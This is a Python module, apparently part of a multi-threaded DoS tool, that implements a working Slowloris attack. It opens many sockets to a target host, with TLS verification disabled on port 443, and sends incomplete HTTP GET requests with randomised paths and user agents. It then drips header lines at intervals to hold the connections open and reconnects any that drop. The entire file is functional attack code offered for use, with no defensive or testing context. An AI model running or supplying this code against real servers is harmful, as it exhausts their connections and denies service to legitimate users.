import socket
import random
import time
import ssl

class SlowlorisAttack:
    def __init__(self, args, config, stats, running, worker_id):
        self.target = args.target
        self.port = args.port
        self.config = config.get('slowloris', {})
        self.stats = stats
        self.running = running
        self.worker_id = worker_id
        self.sockets = []
        
    def _build_partial(self):
        ua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ])
        return f"GET /{random.randint(100000, 999999)} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {ua}\r\n".encode()
    
    def _create_socket(self):
        try:
            if self.port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.config.get('timeout', 5))
                return context.wrap_socket(sock, server_hostname=self.target)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.config.get('timeout', 5))
                return sock
        except:
            return None
    
    def attack(self):
        sockets_per = self.config.get('sockets_per_thread', 150)
        sleep = self.config.get('sleep_interval', 15)
        
        # Initialize sockets
        for _ in range(sockets_per):
            if not self.running.value:
                break
            try:
                sock = self._create_socket()
                if sock:
                    sock.connect((self.target, self.port))
                    sock.send(self._build_partial())
                    self.sockets.append(sock)
                    with self.stats['sent'].get_lock():
                        self.stats['sent'].value += 1
            except:
                pass
        
        # Keep connections alive with partial headers
        while self.running.value:
            for i, sock in enumerate(self.sockets[:]):
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    with self.stats['sent'].get_lock():
                        self.stats['sent'].value += 1
                except:
                    self.sockets.remove(sock)
                    try:
                        new_sock = self._create_socket()
                        if new_sock:
                            new_sock.connect((self.target, self.port))
                            new_sock.send(self._build_partial())
                            self.sockets.append(new_sock)
                    except:
                        pass
            
            time.sleep(sleep)
        
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
